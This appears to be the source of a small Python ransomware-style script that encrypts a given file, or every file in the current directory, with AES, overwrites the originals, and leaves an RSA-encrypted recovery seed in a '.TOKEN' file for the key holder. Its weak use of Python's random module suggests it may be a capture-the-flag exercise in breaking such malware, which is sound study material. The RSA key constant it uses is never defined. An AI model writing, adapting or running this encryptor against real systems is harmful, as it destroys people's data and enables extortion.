import os
import random
import sys
import Crypto
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP


random.seed(random.getrandbits(16))

public_key = RSA.import_key(PUBLIC_RSA_KEY)

cipher_rsa = PKCS1_OAEP.new(public_key)


def processFile(path):
    if path.lower() == "all":
        files = [f for f in os.listdir(".") if os.path.isfile(f)]
        for f in files:
            processFile(f)
        return
    seed = random.randbytes(32)
    random.seed(seed)
    encrypted_seed = cipher_rsa.encrypt(seed)
    cipher = AES.new(random.randbytes(32), AES.MODE_CBC)
    with open(path, "rb") as f:
        contents = f.read()
        encrypted = cipher.encrypt(pad(contents, AES.block_size))

    with open(path, 'wb') as f:
        f.write(cipher.iv)
        f.write(encrypted)

    with open(f"{path}.TOKEN", "wb") as f:
        f.write(encrypted_seed)


def main(args):
    cmdArgs = args[1::]
    cmdArgLen = len(cmdArgs)
    if cmdArgLen < 1:
        print("usage: ./R1.py [input]")
        return

    processFile(cmdArgs[0])


if __name__ == "__main__":
    main(sys.argv)